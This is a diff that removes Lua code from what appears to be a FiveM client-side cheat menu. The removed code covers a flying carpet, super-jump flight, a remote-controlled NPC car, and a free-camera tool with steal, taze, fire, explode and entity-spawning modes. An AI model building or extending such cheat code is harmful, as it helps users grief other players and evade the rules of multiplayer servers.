-            if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["X"]) then
-                carpet = carpet - upVec * speed
-            end
-
-            FM:GetFunction("SetEntityCoords")(magic_carpet_obj, carpet.x, carpet.y, carpet.z)
-        end
-
-        FM:GetFunction("SetEntityRotation")(FM:GetFunction("PlayerPedId")(), rot.x, rot.y, rot.z)
-        FM:GetFunction("AttachEntityToEntity")(FM:GetFunction("PlayerPedId")(), magic_carpet_obj, 0, 0.0, 0.0, 1.0, rot.x, FM:GetFunction("GetEntityHeading")(magic_carpet_obj), rot.z, false, false, false, false, 1, false)
-    end
-
-    local _no_combat
-    local _was_no_combat
-
-    CreateThread(function()
-        while FM.Enabled do
-            Wait(0)
-
-            if _no_combat and not _was_no_combat then
-                _was_no_combat = true
-            elseif not _no_combat and _was_no_combat then
-                _was_no_combat = false
-                FM.FreeCam:DisableCombat(_no_combat)
-            end
-
-            if _no_combat then
-                FM.FreeCam:DisableCombat(_no_combat)
-            end
-        end
-    end)
-
-    CreateThread(function()
-        FM:RequestModelSync("apa_mp_h_acc_rugwoolm_03")
-        FM:GetFunction("RequestAnimDict")("rcmcollect_paperleadinout@")
-
-        while FM.Enabled do
-            Wait(0)
-
-            if FM.Config.Player.MagicCarpet then
-                local our_cam = FM:GetFunction("GetRenderingCam")()
-
-                if not magic_carpet_obj or not FM:GetFunction("DoesEntityExist")(magic_carpet_obj) then
-                    local cur = FM:GetFunction("GetGameplayCamCoord")()
-                    local _dir = FM:GetFunction("GetGameplayCamRot")(0)
-                    local dir = rot_to_dir(_dir)
-                    local dist = 100.0
-                    local len = _multiply(dir, dist)
-                    local targ = cur + len
-                    local handle = FM:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 1, preview_magic_carpet)
-                    local _, hit, hit_pos, _, entity = FM:GetFunction("GetShapeTestResult")(handle)
-
-                    if not preview_magic_carpet or not FM:GetFunction("DoesEntityExist")(preview_magic_carpet) then
-                        _no_combat = true
-                        preview_magic_carpet = FM:GetFunction("CreateObject")(FM:GetFunction("GetHashKey")("apa_mp_h_acc_rugwoolm_03"), hit_pos.x, hit_pos.y, hit_pos.z + 0.5, false, true, true)
-                        FM:GetFunction("SetEntityCollision")(preview_magic_carpet, false, false)
-                        FM:GetFunction("SetEntityAlpha")(preview_magic_carpet, 100)
-                        Wait(50)
-                    elseif hit then
-                        FM:GetFunction("SetEntityCoords")(preview_magic_carpet, hit_pos.x, hit_pos.y, hit_pos.z + 0.5)
-                        FM:GetFunction("SetEntityAlpha")(preview_magic_carpet, 100)
-                        FM:GetFunction("FreezeEntityPosition")(preview_magic_carpet, true)
-                        FM:GetFunction("SetEntityRotation")(preview_magic_carpet, 0.0, 0.0, _dir.z + 0.0)
-                        FM:GetFunction("SetEntityCollision")(preview_magic_carpet, false, false)
-                    end
-
-                    if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["MOUSE1"]) and not FM.Showing then
-                        magic_carpet_obj = FM:GetFunction("CreateObject")(FM:GetFunction("GetHashKey")("apa_mp_h_acc_rugwoolm_03"), hit_pos.x, hit_pos.y, hit_pos.z + 0.5, true, true, true)
-                        FM:DoNetwork(magic_carpet_obj)
-                        local rot = FM:GetFunction("GetEntityRotation")(preview_magic_carpet)
-                        FM:GetFunction("SetEntityRotation")(magic_carpet_obj, rot)
-                        FM.Util:DeleteEntity(preview_magic_carpet)
-                        _no_combat = false
-                    end
-                else
-                    FM:GetFunction("FreezeEntityPosition")(magic_carpet_obj, true)
-                    _do_flying()
-                    local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
-                    local carpet = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, vector_origin)
-                    local dist = FM:GetFunction("GetDistanceBetweenCoords")(coords.x, coords.y, coords.z, carpet.x, carpet.y, carpet.z)
-
-                    if dist <= 5.0 then
-                        FM:Draw3DText(carpet.x, carpet.y, carpet.z, "Press [E] to get " .. (magic_riding and "off" or "on") .. ".", FM.Tertiary[1], FM.Tertiary[2], FM.Tertiary[3])
-
-                        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["E"]) then
-                            magic_riding = not magic_riding
-                            _do_riding()
-                        end
-                    end
-                end
-            else
-                _no_combat = false
-
-                if preview_magic_carpet and FM:GetFunction("DoesEntityExist")(preview_magic_carpet) then
-                    FM.Util:DeleteEntity(preview_magic_carpet)
-                end
-
-                if magic_carpet_obj and FM:GetFunction("DoesEntityExist")(magic_carpet_obj) then
-                    FM.Util:DeleteEntity(magic_carpet_obj)
-                    FM:GetFunction("ClearPedTasks")(FM:GetFunction("PlayerPedId")())
-                end
-            end
-        end
-    end)
-
-    CreateThread(function()
-        while FM.Enabled do
-            if FM.Config.Player.SuperMan then
-                FM:GetFunction("GivePlayerRagdollControl")(PlayerId(), true)
-                FM:GetFunction("SetPedCanRagdoll")(FM:GetFunction("PlayerPedId")(), false)
-                FM:GetFunction("GiveDelayedWeaponToPed")(FM:GetFunction("PlayerPedId")(), 0xFBAB5776, 1, 0)
-                local up, forward = FM:GetFunction("IsControlPressed")(0, FM.Keys["SPACE"]), FM:GetFunction("IsControlPressed")(0, FM.Keys["W"])
-
-                if up or forward then
-                    if up then
-                        FM:GetFunction("ApplyForceToEntity")(FM:GetFunction("PlayerPedId")(), 1, 0.0, 0.0, 9999999.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
-                    elseif FM:GetFunction("IsEntityInAir")(FM:GetFunction("PlayerPedId")()) then
-                        FM:GetFunction("ApplyForceToEntity")(FM:GetFunction("PlayerPedId")(), 1, 0.0, 9999999.0, 0.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
-                    end
-
-                    Wait(0)
-                end
-            else
-                FM:GetFunction("GivePlayerRagdollControl")(PlayerId(), false)
-                FM:GetFunction("SetPedCanRagdoll")(FM:GetFunction("PlayerPedId")(), true)
-            end
-
-            Wait(0)
-        end
-    end)
-
-    FM.RCCar = {
-        Cam = nil,
-        On = false,
-        Driver = nil,
-        Vehicle = nil,
-        CamOn = false,
-        Keys = {
-            NUMPAD_UP = 111,
-            NUMPAD_DOWN = 112,
-            NUMPAD_LEFT = 108,
-            NUMPAD_RIGHT = 109,
-            UP = 188,
-            DOWN = 173,
-            LEFT = 174,
-            RIGHT = 175
-        }
-    }
-
-    local _rc_on
-
-    function FM.RCCar:MoveCar()
-        FM:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(self.Driver, true)
-        FM:GetFunction("NetworkRequestControlOfEntity")(self.Vehicle)
-        FM:GetFunction("SetVehicleEngineOn")(self.Vehicle, true)
-        FM:GetFunction("SetPedAlertness")(self.Driver, 0.0)
-
-        if (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or FM:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (not FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) and not FM:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
-            FM:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 9, 1)
-        end
-
-        if (FM:GetFunction("IsControlReleased")(0, self.Keys.NUMPAD_UP) and FM:GetFunction("IsControlReleased")(0, self.Keys.UP)) or (FM:GetFunction("IsControlJustReleased")(0, self.Keys.NUMPAD_DOWN) or FM:GetFunction("IsControlJustReleased")(0, self.Keys.DOWN)) then
-            FM:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 6, 2500)
-        end
-
-        if (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or FM:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) and (not FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) and not FM:GetFunction("IsControlPressed")(0, self.Keys.UP)) then
-            FM:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 22, 1)
-        end
-
-        if (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_LEFT) or FM:GetFunction("IsControlPressed")(0, self.Keys.LEFT)) and (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or FM:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
-            FM:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 13, 1)
-        end
-
-        if (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_RIGHT) or FM:GetFunction("IsControlPressed")(0, self.Keys.RIGHT)) and (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or FM:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
-            FM:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 14, 1)
-        end
-
-        if (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or FM:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or FM:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
-            FM:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 30, 100)
-        end
-
-        if (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_LEFT) or FM:GetFunction("IsControlPressed")(0, self.Keys.LEFT)) and (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or FM:GetFunction("IsControlPressed")(0, self.Keys.UP)) then
-            FM:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 7, 1)
-        end
-
-        if (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_RIGHT) or FM:GetFunction("IsControlPressed")(0, self.Keys.RIGHT)) and (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or FM:GetFunction("IsControlPressed")(0, self.Keys.UP)) then
-            FM:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 8, 1)
-        end
-
-        if (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_LEFT) or FM:GetFunction("IsControlPressed")(0, self.Keys.LEFT)) and (not FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) and not FM:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (not FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) and not FM:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
-            FM:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 4, 1)
-        end
-
-        if (FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_RIGHT) or FM:GetFunction("IsControlPressed")(0, self.Keys.RIGHT)) and (not FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) and not FM:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (not FM:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) and not FM:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
-            FM:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 5, 1)
-        end
-    end
-
-    local rc_camRP, rc_camRY, rc_camRR
-    local p, y, r
-
-    local function approach(from, to, inc)
-        if from >= to then return from end
-
-        return from + inc
-    end
-
-    function FM.RCCar:GetCamRot(gameplay_rot)
-        local car_rot = FM:GetFunction("GetEntityRotation")(self.Vehicle)
-
-        if not p and not y and not r then
-            p, y, r = car_rot.x, car_rot.y, car_rot.z
-        end
-
-        p = approach(p, car_rot.x, 0.5)
-        y = approach(y, car_rot.y, 0.5)
-        r = approach(r, car_rot.z, 0.5)
-
-        return car_rot.x, car_rot.y, car_rot.z
-    end
-
-    local insults, voices = {"GENERIC_INSULT_HIGH", "GENERIC_INSULT_MED", "GENERIC_SHOCKED_HIGH", "FIGHT_RUN", "CRASH_CAR", "KIFFLOM_GREET", "PHONE_SURPRISE_EXPLOSION"}, {"S_M_Y_SHERIFF_01_WHITE_FULL_01", "A_F_M_SOUCENT_02_BLACK_FULL_01", "A_F_M_BODYBUILD_01_WHITE_FULL_01", "A_F_M_BEVHILLS_02_BLACK_FULL_01"}
-
-    function FM.RCCar:Tick()
-        if not FM:GetFunction("DoesCamExist")(self.Cam) then
-            self.Cam = FM:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)
-        end
-
-        while FM.Enabled do
-            Wait(0)
-
-            if self.On then
-                local rot_vec = FM:GetFunction("GetGameplayCamRot")(0)
-
-                if not FM:GetFunction("DoesEntityExist")(self.Vehicle) then
-                    FM:GetFunction("ClearPedTasksImmediately")(self.Driver)
-                    FM.Util:DeleteEntity(self.Driver)
-                    self.CamOn = false
-                    self.On = false
-                elseif not FM:GetFunction("DoesEntityExist")(self.Driver) or FM:GetFunction("GetPedInVehicleSeat")(self.Vehicle, -1) ~= self.Driver or FM:GetFunction("IsEntityDead")(self.Driver) then
-                    FM:GetFunction("ClearPedTasksImmediately")(FM:GetFunction("GetPedInVehicleSeat")(self.Vehicle, -1))
-                    local model = FM.FreeCam.SpawnerOptions.PED[dict.math.random(1, #FM.FreeCam.SpawnerOptions.PED)]
-                    FM:RequestModelSync(model)
-                    FM.Util:DeleteEntity(self.Driver)
-                    self.Driver = FM:GetFunction("CreatePedInsideVehicle")(self.Vehicle, 24, FM:GetFunction("GetHashKey")(model), -1, true, true)
-                end
-
-                if self.On then
-                    self:MoveCar()
-                    FM:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.Vehicle, true)
-                    FM:GetFunction("SetVehicleDoorsLocked")(self.Vehicle, 2)
-
-                    if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["E"]) then
-                        FM:GetFunction("PlayAmbientSpeechWithVoice")(self.Driver, insults[dict.math.random(1, #insults)], voices[dict.math.random(1, #voices)], "SPEECH_PARAMS_FORCE_SHOUTED", false)
-                    end
-                end
-
-                if self.CamOn and not _rc_on then
-                    FM:GetFunction("SetCamActive")(self.Cam, true)
-                    FM:GetFunction("RenderScriptCams")(true, false, false, true, true)
-                    _rc_on = true
-                    local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Vehicle, 0.0, 0.0, 0.0) + (FM:GetFunction("GetEntityForwardVector")(self.Vehicle) * (FM:GetModelLength(self.Vehicle) * -0.85))
-                    rc_camX, rc_camY, rc_camZ = coords.x, coords.y, coords.z
-                    local rot = FM:GetFunction("GetEntityRotation")(self.Vehicle)
-                    rc_camRP, rc_camRY, rc_camRR = rot.x, rot.y, rot.z
-                    FM:GetFunction("ClearPedTasks")(FM:GetFunction("PlayerPedId")())
-                    walking = false
-                elseif not self.CamOn and _rc_on then
-                    FM:GetFunction("FreezeEntityPosition")(FM:GetFunction("PlayerPedId")(), false)
-                    FM:GetFunction("SetCamActive")(self.Cam, false)
-                    FM:GetFunction("RenderScriptCams")(false, false, false, false, false)
-                    FM:GetFunction("SetFocusEntity")(FM:GetFunction("PlayerPedId")())
-                    FM.FreeCam:DisableMovement(false)
-                    _rc_on = false
-                end
-
-                if self.CamOn and _rc_on then
-                    local ent_pos = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Vehicle, 0.0, 0.0, 0.0) + (FM:GetFunction("GetEntityForwardVector")(self.Vehicle) * (FM:GetModelLength(self.Vehicle) * -0.85))
-
-                    if not FM:GetFunction("IsPedInAnyVehicle")(FM:GetFunction("PlayerPedId")()) and not FM.Config.UseAutoWalkAlt then
-                        FM:GetFunction("FreezeEntityPosition")(FM:GetFunction("PlayerPedId")(), true)
-                    elseif FM.Config.UseAutoWalkAlt then
-                        FM:GetFunction("FreezeEntityPosition")(FM:GetFunction("PlayerPedId")(), false)
-                    end
-
-                    FM:DrawIbuttons()
-                    FM.FreeCam:DisableMovement(true)
-                    FM:GetFunction("SetFocusPosAndVel")(rc_camX, rc_camY, rc_camZ, 0, 0, 0)
-                    FM:GetFunction("SetCamCoord")(self.Cam, rc_camX, rc_camY, rc_camZ)
-                    FM:GetFunction("SetCamRot")(self.Cam, rc_camRP + 0.0, rc_camRY + 0.0, rc_camRR + 0.0)
-                    rc_camX, rc_camY, rc_camZ = ent_pos.x, ent_pos.y, ent_pos.z
-                    rc_camRP, rc_camRY, rc_camRR = self:GetCamRot(rot_vec)
-                    rc_camZ = rc_camZ + (FM:GetModelHeight(self.Vehicle) * 1.2)
-                end
-            end
-        end
-    end
-
-    FM.FreeCam = {
-        Cam = nil,
-        On = false,
-        Modifying = nil,
-        Mode = 1, -- FM.FreeCam.Modes["LOOK_AROUND"],
-        Modes = {
-            ["LOOK_AROUND"] = 1,
-            ["REMOVER"] = 2,
-            ["PED_SPAWNER"] = 3,
-            ["OBJ_SPAWNER"] = 4,
-            ["VEH_SPAWNER"] = 5,
-            ["PREMADE_SPAWNER"] = 6,
-            ["TELEPORT"] = 7,
-            ["RC_CAR"] = 8,
-            ["STEAL"] = 9,
-            ["TAZE"] = 10,
-            ["HYDRANT"] = 11,
-            ["FIRE"] = 12,
-            ["SPIKE_STRIPS"] = 13,
-            ["DISABLE_VEHICLE"] = 14,
-            ["EXPLODE"] = 15
-        },
-        ModeNames = {
-            [1] = "Look Around",
-            [2] = "Remover",
-            [3] = "Ped Spawner",
-            [4] = "Object Spawner",
-            [5] = "Vehicle Spawner",
-            [6] = "Premade Spawner",
-            [7] = "Teleport",
-            [8] = "RC Car",
-            [9] = "Steal",
-            [10] = "Taze Entity",
-            [11] = "Hydrant Entity",
-            [12] = "Fire Entity",
-            [13] = "Place Spike Strips",
-            [14] = "Disable Vehicle",
-            [15] = "Explode Entity"
-        }
-    }
-
-    function FM.FreeCam:Switcher()
-        if not self.On then return end
-        local cur = self.Mode
-        local new = cur
-        if self.DraggingEntity and FM:GetFunction("DoesEntityExist")(self.DraggingEntity) then return end
-
-        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["["]) then
-            new = cur - 1
-
-            if not self.ModeNames[new] then
-                new = #self.ModeNames
-            end
-
-            self.Mode = new
-        end
-
-        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["]"]) then
-            new = cur + 1
-
-            if not self.ModeNames[new] then
-                new = 1
-            end
-
-            self.Mode = new
-        end
-    end
-
-    function FM.FreeCam:Toggle(mode)
-        self.On = not self.On
-        self.Mode = mode
-    end
-
-    function FM.FreeCam:GetModelSize(hash)
-        return FM:GetFunction("GetModelDimensions")(hash)
-    end
-
-    function FM.FreeCam:DrawBoundingBox(entity, r, g, b, a)
-        if entity then
-            r = r or 255
-            g = g or 0
-            b = b or 0
-            a = a or 40
-            local model = FM:GetFunction("GetEntityModel")(entity)
-            local min, max = FM:GetFunction("GetModelDimensions")(model)
-            local top_front_right = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, max)
-            local top_back_right = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, min.y, max.z))
-            local bottom_front_right = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, max.y, min.z))
-            local bottom_back_right = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, min.y, min.z))
-            local top_front_left = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, max.y, max.z))
-            local top_back_left = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, min.y, max.z))
-            local bottom_front_left = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, max.y, min.z))
-            local bottom_back_left = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, min)
-            -- LINES
-            -- RIGHT SIDE
-            FM:GetFunction("DrawLine")(top_front_right, top_back_right, r, g, b, a)
-            FM:GetFunction("DrawLine")(top_front_right, bottom_front_right, r, g, b, a)
-            FM:GetFunction("DrawLine")(bottom_front_right, bottom_back_right, r, g, b, a)
-            FM:GetFunction("DrawLine")(top_back_right, bottom_back_right, r, g, b, a)
-            -- LEFT SIDE
-            FM:GetFunction("DrawLine")(top_front_left, top_back_left, r, g, b, a)
-            FM:GetFunction("DrawLine")(top_back_left, bottom_back_left, r, g, b, a)
-            FM:GetFunction("DrawLine")(top_front_left, bottom_front_left, r, g, b, a)
-            FM:GetFunction("DrawLine")(bottom_front_left, bottom_back_left, r, g, b, a)
-            -- Connection
-            FM:GetFunction("DrawLine")(top_front_right, top_front_left, r, g, b, a)
-            FM:GetFunction("DrawLine")(top_back_right, top_back_left, r, g, b, a)
-            FM:GetFunction("DrawLine")(bottom_front_left, bottom_front_right, r, g, b, a)
-            FM:GetFunction("DrawLine")(bottom_back_left, bottom_back_right, r, g, b, a)
-            -- POLYGONS
-            -- FRONT
-            FM:GetFunction("DrawPoly")(top_front_left, top_front_right, bottom_front_right, r, g, b, a)
-            FM:GetFunction("DrawPoly")(bottom_front_right, bottom_front_left, top_front_left, r, g, b, a)
-            -- TOP
-            FM:GetFunction("DrawPoly")(top_front_right, top_front_left, top_back_right, r, g, b, a)
-            FM:GetFunction("DrawPoly")(top_front_left, top_back_left, top_back_right, r, g, b, a)
-            -- BACK
-            FM:GetFunction("DrawPoly")(top_back_right, top_back_left, bottom_back_right, r, g, b, a)
-            FM:GetFunction("DrawPoly")(top_back_left, bottom_back_left, bottom_back_right, r, g, b, a)
-            -- LEFT
-            FM:GetFunction("DrawPoly")(top_back_left, top_front_left, bottom_front_left, r, g, b, a)
-            FM:GetFunction("DrawPoly")(bottom_front_left, bottom_back_left, top_back_left, r, g, b, a)
-            -- RIGHT
-            FM:GetFunction("DrawPoly")(top_front_right, top_back_right, bottom_front_right, r, g, b, a)
-            FM:GetFunction("DrawPoly")(top_back_right, bottom_back_right, bottom_front_right, r, g, b, a)
-            -- BOTTOM
-            FM:GetFunction("DrawPoly")(bottom_front_left, bottom_front_right, bottom_back_right, r, g, b, a)
-            FM:GetFunction("DrawPoly")(bottom_back_right, bottom_back_left, bottom_front_left, r, g, b, a)
-
-            return true
-        end
-
-        return false
-    end
-
-    function FM.FreeCam:Crosshair(on)
-        if on then
-            FM:GetFunction("DrawRect")(0.5, 0.5, 0.008333333, 0.001851852, FM.Tertiary[1], FM.Tertiary[2], FM.Tertiary[3], 255)
-            FM:GetFunction("DrawRect")(0.5, 0.5, 0.001041666, 0.014814814, FM.Tertiary[1], FM.Tertiary[2], FM.Tertiary[3], 255)
-        else
-            FM:GetFunction("DrawRect")(0.5, 0.5, 0.008333333, 0.001851852, 100, 100, 100, 255)
-            FM:GetFunction("DrawRect")(0.5, 0.5, 0.001041666, 0.014814814, 100, 100, 100, 255)
-        end
-    end
-
-    function FM:Draw3DText(x, y, z, text, r, g, b)
-        FM:GetFunction("SetDrawOrigin")(x, y, z, 0)
-        FM:GetFunction("SetTextFont")(0)
-        FM:GetFunction("SetTextProportional")(0)
-        FM:GetFunction("SetTextScale")(0.0, 0.20)
-        FM:GetFunction("SetTextColour")(r, g, b, 255)
-        FM:GetFunction("SetTextOutline")()
-        FM:GetFunction("BeginTextCommandDisplayText")("STRING")
-        FM:GetFunction("SetTextCentre")(1)
-        FM:GetFunction("AddTextComponentSubstringPlayerName")(text)
-        FM:GetFunction("EndTextCommandDisplayText")(0.0, 0.0)
-        FM:GetFunction("ClearDrawOrigin")()
-    end
-
-    function FM:DrawScaled3DText(x, y, z, textInput, fontId, scaleX, scaleY)
-        local coord = FM:GetFunction("GetFinalRenderedCamCoord")()
-        local px, py, pz = coord.x, coord.y, coord.z
-        local dist = FM:GetFunction("GetDistanceBetweenCoords")(px, py, pz, x, y, z)
-        local scale = (1 / dist) * 20
-        local fov = (1 / FM:GetFunction("GetGameplayCamFov")()) * 100
-        local scale = scale * fov
-        FM:GetFunction("SetTextScale")(scaleX * scale, scaleY * scale)
-        FM:GetFunction("SetTextFont")(fontId)
-        FM:GetFunction("SetTextProportional")(1)
-        FM:GetFunction("SetTextColour")(250, 250, 250, 255) -- You can change the text color here
-        FM:GetFunction("SetTextDropShadow")(1, 1, 1, 1, 255)
-        FM:GetFunction("SetTextEdge")(2, 0, 0, 0, 150)
-        FM:GetFunction("SetTextDropShadow")()
-        FM:GetFunction("SetTextOutline")()
-        FM:GetFunction("BeginTextCommandDisplayText")("STRING")
-        FM:GetFunction("SetTextCentre")(1)
-        FM:GetFunction("AddTextComponentSubstringPlayerName")(textInput)
-        FM:GetFunction("SetDrawOrigin")(x, y, z + 2, 0)
-        FM:GetFunction("EndTextCommandDisplayText")(0.0, 0.0)
-        FM:GetFunction("ClearDrawOrigin")()
-    end
-
-    function FM.FreeCam:DrawInfoCard(entity)
-        if not FM:GetFunction("DoesEntityExist")(entity) then return end
-        local coords = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, 0.0, 0.0, 0.0)
-        local angle = FM:GetFunction("GetEntityRotation")(entity)
-
-        if frozen_ents[entity] == nil then
-            frozen_ents[entity] = false
-        end
-
-        local str = {[[ Model: ]] .. FM:GetFunction("GetEntityModel")(entity), [[ Pos: ]] .. ("x: %.2f, y: %.2f, z: %.2f"):format(coords.x, coords.y, coords.z), [[ Rot: ]] .. ("x: %.2f, y: %.2f, z: %.2f"):format(angle.x, angle.y, angle.z), [[ Frozen: ]] .. dict.tostring(frozen_ents[entity])}
-        local y = coords.z
-
-        for _, val in dict.pairs(str) do
-            FM:DrawScaled3DText(coords.x, coords.y, y, val, 4, 0.1, 0.1)
-            y = y - 0.35
-        end
-    end
-
-    function FM.FreeCam:CheckType(entity, type)
-        if type == "ALL" then return FM:GetFunction("IsEntityAnObject")(entity) or FM:GetFunction("IsEntityAVehicle")(entity) or FM:GetFunction("IsEntityAPed")(entity) end
-        if type == "VEHICLE" then return FM:GetFunction("IsEntityAVehicle")(entity) end
-        if type == "PED" then return FM:GetFunction("IsEntityAPed")(entity) end
-
-        return true
-    end
-
-    function FM.FreeCam:GetType(entity)
-        if FM:GetFunction("IsEntityAnObject")(entity) then return "OBJECT" end
-        if FM:GetFunction("IsEntityAVehicle")(entity) then return "VEHICLE" end
-        if FM:GetFunction("IsEntityAPed")(entity) then return "PED" end
-    end
-
-    function FM.FreeCam:Clone(entity)
-        local type = self:GetType(entity)
-        if not type then return end
-        local where = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, 0.1, 0.1, 0.1)
-        local rot = FM:GetFunction("GetEntityRotation")(entity)
-
-        if type == "OBJECT" then
-            local clone = FM:GetFunction("CreateObject")(FM:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, true, true, true)
-            FM:DoNetwork(clone)
-            FM:GetFunction("SetEntityRotation")(clone, rot)
-            frozen_ents[clone] = frozen_ents[entity]
-            self.DraggingEntity = clone
-            FM:AddNotification("INFO", "Cloned object ~y~" .. entity)
-            Wait(50)
-        elseif type == "VEHICLE" then
-            local clone = FM:GetFunction("CreateVehicle")(FM:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, FM:GetFunction("GetEntityHeading")(entity), true, true)
-            FM:GetFunction("SetEntityRotation")(clone, rot)
-            frozen_ents[clone] = frozen_ents[entity]
-            self.DraggingEntity = clone
-            FM:AddNotification("INFO", "Cloned vehicle ~y~" .. entity)
-        elseif type == "PED" then
-            local clone = FM:GetFunction("CreatePed")(4, FM:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, FM:GetFunction("GetEntityHeading")(entity), true, true)
-            FM:GetFunction("SetEntityRotation")(clone, rot)
-            frozen_ents[clone] = frozen_ents[entity]
-            self.DraggingEntity = clone
-            FM:AddNotification("INFO", "Cloned ped ~y~" .. entity)
-        end
-    end
-
-    function FM.FreeCam:Remover(entity, type)
-        FM:SetIbuttons({{FM:GetFunction("GetControlInstructionalButton")(0, FM.Keys["MOUSE1"], 0), "Delete"}, {"b_117", "Change Mode"}})
-
-        if FM:GetFunction("DoesEntityExist")(entity) and FM:GetFunction("DoesEntityHaveDrawable")(entity) and self:CheckType(entity, type) then
-            self:DrawBoundingBox(entity, 255, 50, 50, 50)
-
-            if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE1"]) and not FM.Showing then
-                if entity == FM:GetFunction("PlayerPedId")() then return FM:AddNotification("ERROR", "You can not delete yourself!", 10000) end
-                if _is_ped_player(entity) then return FM:AddNotification("ERROR", "You can not delete players!", 10000) end
-                self:DrawBoundingBox(entity, 255, 50, 50, 50)
-                FM:AddNotification("INFO", "Deleted ~y~" .. dict.tostring(entity), 10000)
-                FM.Util:DeleteEntity(entity)
-
-                return
-            end
-        end
-    end
-
-    function FM.FreeCam:Attack(attacker, victim)
-        FM:GetFunction("ClearPedTasks")(attacker)
-
-        if FM:GetFunction("IsEntityAPed")(victim) then
-            FM:GetFunction("TaskCombatPed")(attacker, victim, 0, 16)
-            FM:AddNotification("INFO", "~y~" .. dict.tostring(attacker) .. " ~w~attacking ~y~" .. dict.tostring(victim), 5000)
-        elseif FM:GetFunction("IsEntityAVehicle")(victim) then
-            CreateThread(function()
-                FM:StealVehicleThread(attacker, victim)
-            end)
-
-            FM:AddNotification("INFO", "~y~" .. dict.tostring(attacker) .. " ~w~stealing ~y~" .. dict.tostring(victim), 5000)
-        end
-    end
-
-    local beginning_target
-
-    function FM.FreeCam:PedTarget(cam, x, y, z)
-        local rightVec, forwardVec, upVec = FM:GetFunction("GetCamMatrix")(cam)
-        local curVec = vector3(x, y, z)
-        local targetVec = curVec + forwardVec * 150
-        local handle = FM:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1)
-        local _, _, endCoords, _, entity = FM:GetFunction("GetShapeTestResult")(handle)
-
-        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys["MOUSE2"]) then
-            beginning_target = nil
-        end
-
-        if not FM:GetFunction("DoesEntityExist")(beginning_target) then
-            beginning_target = nil
-        else
-            self:DrawBoundingBox(beginning_target, 0, 100, 0, 50)
-
